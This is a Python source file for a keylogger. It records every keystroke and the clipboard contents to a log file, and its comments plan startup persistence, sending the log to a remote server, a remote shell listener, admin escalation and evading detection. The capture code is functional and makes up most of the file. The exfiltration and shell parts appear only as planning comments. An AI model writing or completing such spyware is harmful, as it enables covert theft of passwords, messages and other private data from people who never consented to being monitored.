import pyperclip
import logging
from pynput import keyboard

import socket, sys


# Boot on startup?
# Send log over socket to server? When?
# Add command to listen on a specific port for a shell?..
# pyinstaller -> exe/dmg?
# OS detection based installation of startup process.
# How to run as sudo/admin?
# # registry/launchd
# # undetectable?
# erase the log file in place..?
# Cython for speed?
# Clean up/color logging?

### KEYLOGGER

logging.basicConfig(filename='snoop.log',level=logging.DEBUG, format='%(asctime)s | %(message)s')
logging.info('Started')

log_str = ''
special_keys = ['space', 'esc', 'ctrl', 'shift', 'enter', 'tab', 'caps_lock', 'alt', 'backspace', 'cmd', 'up', 'down', 'left', 'right']

def get_clipboard():
  clipboard = pyperclip.paste()
  if isinstance(clipboard, str):
    return clipboard
  return 0

def special_key_filter(name):
  global special_keys
  global log_str
  for i, v in enumerate(special_keys):
    if (v in name):
      log_str += ' `{}` '.format(v[:2])

def on_press(key):
  global log_str
  filtered_key = str(key).replace('\'', '')

  if ('Key.' in filtered_key):
    special_key_filter(filtered_key)
    print(filtered_key)
  else:
    log_str += filtered_key
    print(filtered_key)

  if key == keyboard.Key.enter or len(log_str) >= 40:
    if (get_clipboard() != ''):
      logging.info('current clipboard: ' + get_clipboard())
    logging.debug(log_str)
    log_str = ''

with keyboard.Listener( on_press = on_press ) as listener:
    listener.join()

### SOCKETS

# check log file size. 
# if it reaches a certain size, open the socket connection and send?

    